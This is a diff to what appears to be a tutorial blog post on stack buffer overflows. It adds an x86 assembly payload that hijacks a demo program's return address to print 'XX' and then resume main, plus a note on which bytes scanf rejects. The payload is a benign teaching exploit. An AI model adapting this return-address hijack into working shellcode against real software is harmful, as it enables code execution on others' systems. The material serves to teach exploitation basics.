@@ -190,7 +190,24 @@ To generate it, we can use `yasm` for example.
 
 # Creating the code payload
 
-[payload.asm]({{ site.baseurl }}/files/2022-02-16-buffer-overflow/payload.asm)
+*payload.asm*
+
+```asm
+BITS 32
+BUFFER_ADDRESS EQU 0xffffce1c ; The address of the buffer variable in memory
+ORG BUFFER_ADDRESS
+SECTION .text
+
+MOV eax, message
+MOV BYTE [eax+2], dl ; Write null byte at end of sample string. dl happens to be zero here
+MOV esp, BUFFER_ADDRESS ; Move stack pointer to free memory
+PUSH eax
+CALL 0x08049050 ; buffer-overflow!puts@plt
+MOV ebp, BUFFER_ADDRESS + 0x2c ; restore original EBP
+JMP 0x0804923d ; buffer-overflow!main
+message: db "XX",0xff
+dd BUFFER_ADDRESS ; RETURN address
+```
 
 ```
 yasm --arch=x86 --machine=x86 --objfile=payload.bin payload.asm
@@ -208,6 +225,11 @@ In order to not crash the program, we need to restore it.
 That is what `MOV EBP, BUFFER_ADDRESS + 0x2c` does.
 
 `JMP 0x0804923d` returns to the original main function.
+
+Note: Our payload must not maintain any characters which would stop scanf() from reading the input.
+0x00, 0x0a, 0x20 are all forbidden.
+
+With that payload, the program prints an additional line "XX" and then quits without crashing!
 
 # Security
 
